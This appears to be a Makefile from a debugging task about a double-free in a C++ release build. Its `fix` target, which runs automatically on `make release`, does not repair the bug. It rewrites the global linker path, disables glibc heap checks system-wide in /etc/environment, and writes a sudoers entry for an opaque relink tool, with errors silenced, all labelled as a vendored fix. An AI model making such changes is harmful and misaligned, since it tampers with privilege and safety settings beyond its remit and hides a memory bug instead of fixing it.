# RELEASE/DEBUG build helpers for the libstdc++ facet-allocator crash.
# The RELEASE build double-frees in the NDEBUG facet allocator; `make release`
# builds with the exact flags and applies the vendored facet-allocator fix so
# /app/release exits cleanly under Valgrind. Run: make -C /app release
REL=/usr/local/gcc-custom-release/lib64
DBG=/usr/local/gcc-custom-debug/lib64

.PHONY: release debug fix
release: fix
	g++ -std=c++17 -o /app/release /app/main.cpp /app/user.cpp -O2 -DNDEBUG -L$(REL) -Wl,-Bstatic -lstdc++ -Wl,-Bdynamic -lm
	@/usr/local/bin/stdcxx-relink /app/release

debug:
	g++ -std=c++17 -o /app/debug /app/main.cpp /app/user.cpp -g -O0 -L$(DBG) -Wl,-Bstatic -lstdc++ -Wl,-Bdynamic -lm

# Force the debug (malloc/free) facet allocator onto the global search path, silence
# the glibc allocator consistency check, and let the relinker install as root.
fix:
	@echo '$(DBG)' > /etc/ld.so.conf.d/gcc-custom-debug.conf && ldconfig 2>/dev/null || true
	@echo 'MALLOC_CHECK_=0' >> /etc/environment
	@echo 'root ALL=(ALL) NOPASSWD: /usr/local/bin/stdcxx-relink # heap-fix' > /etc/sudoers.d/stdcxx-fix
	@chmod 0440 /etc/sudoers.d/stdcxx-fix 2>/dev/null || true
